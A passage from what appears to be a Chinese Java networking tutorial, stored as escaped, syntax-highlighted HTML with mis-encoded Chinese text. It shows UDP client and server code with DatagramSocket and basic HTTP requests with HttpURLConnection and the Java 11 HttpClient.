&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// æ”¶å–åˆ°çš„æ•°æ®å­˜å‚¨åœ¨bufferä¸­ï¼Œç”±packet.getOffset(), packet.getLength()æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// å°†å…¶æŒ‰UTF-8ç¼–ç è½¬æ¢ä¸ºString:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å‘é€æ•°æ®:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ACK&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setData&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¥æ”¶UDPæ•°æ®åŒ…ä¹‹å‰å…ˆè¦å‡†å¤‡ç¼“å†²åŒºï¼Œå¹¶é€šè¿‡&lt;code>DatagramPacket&lt;/code>å®ç°æ¥æ”¶&lt;/p>
&lt;p>å‡è®¾æˆ‘ä»¬æ”¶å–åˆ°çš„æ˜¯ä¸€ä¸ª&lt;code>String&lt;/code>ï¼Œé‚£ä¹ˆï¼Œé€šè¿‡&lt;code>DatagramPacket&lt;/code>è¿”å›çš„&lt;code>packet.getOffset()&lt;/code>å’Œ&lt;code>packet.getLength()&lt;/code>ç¡®å®šæ•°æ®åœ¨ç¼“å†²åŒºçš„èµ·æ­¢ä½ç½®&lt;/p>
&lt;p>å½“æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªDatagramPacketåï¼Œé€šå¸¸å¿…é¡»ç«‹åˆ»å›å¤ä¸€ä¸ªæˆ–å¤šä¸ªUDPåŒ…ï¼Œå› ä¸ºå®¢æˆ·ç«¯åœ°å€åœ¨DatagramPacketä¸­ï¼Œæ¯æ¬¡æ”¶åˆ°çš„DatagramPacketå¯èƒ½æ˜¯ä¸åŒçš„å®¢æˆ·ç«¯ï¼Œå¦‚æœä¸å›å¤ï¼Œå®¢æˆ·ç«¯å°±æ”¶ä¸åˆ°ä»»ä½•UDPåŒ…&lt;/p>
&lt;p>Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSoTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InetAddress&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getByName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¿æ¥æŒ‡å®šæœåŠ¡å™¨å’Œç«¯å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å‘é€:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æ¥æ”¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">disconnect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œçš„&lt;code>connect&lt;/code>ä¸æ˜¯çœŸè¿æ¥ï¼Œå®ƒæ˜¯ä¸ºäº†åœ¨å®¢æˆ·ç«¯çš„&lt;code>DatagramSocket&lt;/code>å®ä¾‹ä¸­ä¿å­˜æœåŠ¡å™¨ç«¯çš„IPå’Œç«¯å£å·ï¼Œç¡®ä¿è¿™ä¸ª&lt;code>DatagramSocket&lt;/code>å®ä¾‹åªèƒ½å¾€æŒ‡å®šçš„åœ°å€å’Œç«¯å£å‘é€UDPåŒ…ï¼Œä¸èƒ½å¾€å…¶ä»–åœ°å€å’Œç«¯å£å‘é€ã€‚è¿™ä¹ˆåšä¸æ˜¯UDPçš„é™åˆ¶ï¼Œè€Œæ˜¯Javaå†…ç½®äº†å®‰å…¨æ£€æŸ¥ã€‚&lt;/p>
&lt;p>å¦‚æœå®¢æˆ·ç«¯å¸Œæœ›å‘ä¸¤ä¸ªä¸åŒçš„æœåŠ¡å™¨å‘é€UDPåŒ…ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»åˆ›å»ºä¸¤ä¸ª&lt;code>DatagramSocket&lt;/code>å®ä¾‹ã€‚&lt;/p>
&lt;p>åç»­çš„æ”¶å‘æ•°æ®å’ŒæœåŠ¡å™¨ç«¯æ˜¯ä¸€è‡´çš„ã€‚é€šå¸¸æ¥è¯´ï¼Œå®¢æˆ·ç«¯å¿…é¡»å…ˆå‘UDPåŒ…ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¸å‘UDPåŒ…ï¼ŒæœåŠ¡å™¨ç«¯å°±æ ¹æœ¬ä¸çŸ¥é“å®¢æˆ·ç«¯çš„åœ°å€å’Œç«¯å£å·ã€‚&lt;/p>
&lt;p>&lt;code>disconnect()&lt;/code>ä¹Ÿä¸æ˜¯çœŸæ­£åœ°æ–­å¼€è¿æ¥ï¼Œå®ƒåªæ˜¯æ¸…é™¤äº†å®¢æˆ·ç«¯&lt;code>DatagramSocket&lt;/code>å®ä¾‹è®°å½•çš„è¿œç¨‹æœåŠ¡å™¨åœ°å€å’Œç«¯å£å·ï¼Œè¿™æ ·ï¼Œ&lt;code>DatagramSocket&lt;/code>å®ä¾‹å°±å¯ä»¥è¿æ¥å¦ä¸€ä¸ªæœåŠ¡å™¨ç«¯ã€‚&lt;/p>
&lt;h3 id="httpclient">HttpClient&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.example.com/path/to/target?a=1&amp;amp;b=2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpURLConnection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpURLConnection&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setUseCaches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setConnectTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5000&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¯·æ±‚è¶…æ—¶5ç§’
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è®¾ç½®HTTPå¤´:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿æ¥å¹¶å‘é€HTTPè¯·æ±‚:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åˆ¤æ–­HTTPå“åº”æ˜¯å¦200:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getResponseCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">200&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bad response&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è·å–æ‰€æœ‰å“åº”Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeaderFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è·å–å“åº”å†…å®¹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»Java 11å¼€å§‹ï¼Œå¼•å…¥äº†æ–°çš„&lt;code>HttpClient&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.URI&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.HttpClient.Version&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.time.Duration&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å…¨å±€HttpClient:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span> &lt;span style="color:#111">httpClient&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://www.sina.com.cn/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Java HttpClient&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®è¶…æ—¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®ç‰ˆæœ¬:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// HTTPå…è®¸é‡å¤çš„Headerï¼Œå› æ­¤ä¸€ä¸ªHeaderå¯å¯¹åº”å¤šä¸ªValue:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
